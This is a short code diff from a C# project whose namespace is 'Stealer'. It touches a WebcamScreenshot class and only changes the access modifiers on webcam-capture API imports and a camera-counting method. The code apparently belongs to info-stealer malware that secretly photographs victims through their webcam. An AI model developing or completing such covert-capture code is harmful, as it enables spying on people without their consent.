@@ -9,16 +9,16 @@ namespace Stealer
     internal sealed class WebcamScreenshot
     {
 		[DllImport("avicap32.dll", EntryPoint = "capCreateCaptureWindowA")]
-		public static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int X, int Y, int nWidth, int nHeight, int hwndParent, int nID);
+		private static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int X, int Y, int nWidth, int nHeight, int hwndParent, int nID);
 		[DllImport("user32", EntryPoint = "SendMessage")]
-		public static extern int SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);
+		private static extern int SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);
 
 		private static IntPtr Handle;
 		private static int delay = 3000;
 
 
 		// Get connected cameras count
-		private static int GetConnectedCamerasCount()
+		public static int GetConnectedCamerasCount()
 		{
 			int cameras = 0;
 			try
